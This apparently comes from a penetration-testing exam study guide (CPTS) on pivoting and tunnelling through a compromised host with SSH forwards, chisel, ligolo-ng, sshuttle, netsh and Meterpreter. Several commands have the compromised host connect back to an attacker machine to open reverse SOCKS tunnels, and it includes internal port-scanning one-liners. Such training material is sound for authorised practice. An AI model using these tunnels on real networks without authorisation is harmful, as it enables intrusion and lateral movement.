# Pivoting, Tunneling & Port Forwarding

**Once you own a dual-homed host, it becomes your gateway into the internal network.** The CPTS exam almost always has a second (and third) subnet you can only reach through a pivot. Master SSH, chisel, and ligolo-ng — you only need one to work.

> Terminology: **Local (`-L`)** = pull a remote port to you. **Remote/Reverse (`-R`)** = push a local port out to the pivot. **Dynamic (`-D`)** = a SOCKS proxy that routes *any* port. Interface: your attack box is usually `tun0`.

---

## Step 0 — Discover the Second Network

From the pivot host (the box you own):
```bash
ip a; ip route; arp -a                    # what other subnets/hosts does it see?
cat /etc/hosts
# Ping-sweep the internal range from the pivot:
for i in $(seq 1 254); do (ping -c1 -W1 172.16.5.$i >/dev/null && echo "172.16.5.$i up" &); done
# Or upload a static nmap / use a bash TCP scan:
for p in 22 80 445 3389; do (echo > /dev/tcp/172.16.5.10/$p) 2>/dev/null && echo "port $p open"; done
```

---

## Method 1 — SSH Tunneling (when you have SSH creds/keys)

```bash
# LOCAL forward: reach internal host 172.16.5.10:445 at your localhost:4455
ssh -L 4455:172.16.5.10:445 user@{target}

# DYNAMIC (SOCKS proxy) — the powerful one; routes ALL ports through the pivot
ssh -D 1080 user@{target}
# then set /etc/proxychains4.conf:  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p445,3389 172.16.5.10
proxychains xfreerdp /u:admin /v:172.16.5.10

# REMOTE/REVERSE forward: pivot can't be SSH'd INTO, but can reach OUT to you.
# Expose the pivot's internal-facing service on YOUR box's port 8000:
ssh -R 8000:172.16.5.10:80 youruser@YOUR_KALI_IP     # run FROM the pivot toward you

# Flags: -N (no shell) -f (background) -g (allow others to use the forward)
ssh -fN -D 1080 user@{target}
```

---

## Method 2 — chisel (no SSH needed; great for Windows pivots)

The reliable pattern is a **reverse SOCKS proxy**: server on your Kali, client on the pivot dialing back.

```bash
# 1) On YOUR Kali (server, listening for the pivot to connect back):
chisel server -p 8080 --reverse

# 2) On the PIVOT (client) — upload the chisel binary first, then:
./chisel client YOUR_KALI_IP:8080 R:socks
#   Windows:  chisel.exe client YOUR_KALI_IP:8080 R:socks

# 3) A SOCKS5 proxy is now on your Kali at 127.0.0.1:1080. Use it:
#    /etc/proxychains4.conf ->  socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.5.10
proxychains crackmapexec smb 172.16.5.0/24
```

Single-port reverse forward (e.g. expose internal 172.16.5.10:3389 on your Kali:3389):
```bash
# Kali:   chisel server -p 8080 --reverse
# Pivot:  ./chisel client YOUR_KALI_IP:8080 R:3389:172.16.5.10:3389
xfreerdp /u:admin /v:127.0.0.1:3389
```

---

## Method 3 — ligolo-ng (cleanest; makes the subnet feel local — no proxychains)

```bash
# 1) On Kali: set up the tun interface once
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                      # starts the ligolo server/console

# 2) On the PIVOT: upload the agent, dial back to your Kali:11601
./agent -connect YOUR_KALI_IP:11601 -ignore-cert

# 3) In the ligolo console: select the session, add a route to the internal subnet
session            # pick the agent
# on Kali, add the route to the discovered subnet:
sudo ip route add 172.16.5.0/24 dev ligolo
# back in console:
start
# Now 172.16.5.0/24 is directly reachable — NO proxychains:
nmap -sT 172.16.5.10
xfreerdp /u:admin /v:172.16.5.10
```

Ligolo can also **listen** on the agent to receive reverse shells from deep hosts (`listener_add`).

---

## Method 4 — sshuttle (VPN-like, needs SSH + python on pivot)

```bash
sshuttle -r user@{target} 172.16.5.0/24
# Now the whole subnet is routed transparently — use tools normally, no proxychains.
```

---

## Method 5 — Windows-native / no-tool pivots

```powershell
# netsh port-forward (Windows pivot, needs admin) — forward local 4455 -> internal 445
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=0.0.0.0 connectport=445 connectaddress=172.16.5.10
netsh interface portproxy show all
# remove:
netsh interface portproxy delete v4tov4 listenport=4455 listenaddress=0.0.0.0
```

Meterpreter routing (if you have a meterpreter session on the pivot):
```
meterpreter> run autoroute -s 172.16.5.0/24
msf> use auxiliary/server/socks_proxy   (set SRVPORT 1080; run)
# then proxychains as usual
```

---

## Using the Proxy — proxychains tips

```bash
# /etc/proxychains4.conf  (bottom):
#   socks5 127.0.0.1 1080
# Use quiet mode + prevent DNS leaks:
proxychains4 -q nmap -sT -Pn -n 172.16.5.10
```
- **Always use `-sT` (TCP connect) through proxychains** — SYN scans (`-sS`) don't work over SOCKS.
- **Disable ICMP host discovery** with `-Pn` (ping won't traverse the proxy).
- SOCKS carries TCP only; for UDP tools use ligolo-ng or sshuttle instead.

## Common Mistakes

- **Using `-sS` over proxychains** → no results. Use `-sT -Pn`.
- **Chisel direction confusion.** Server = your Kali (`--reverse`), client = the pivot dialing back with `R:socks`.
- **Forgetting to add the route** in ligolo — the tunnel is up but traffic has nowhere to go.
- **DNS leaks** revealing you're proxying — set `proxy_dns` off or use IPs.
- **Losing the tunnel** when your shell dies — run tunnels with `-fN` / in a separate session / as a service.
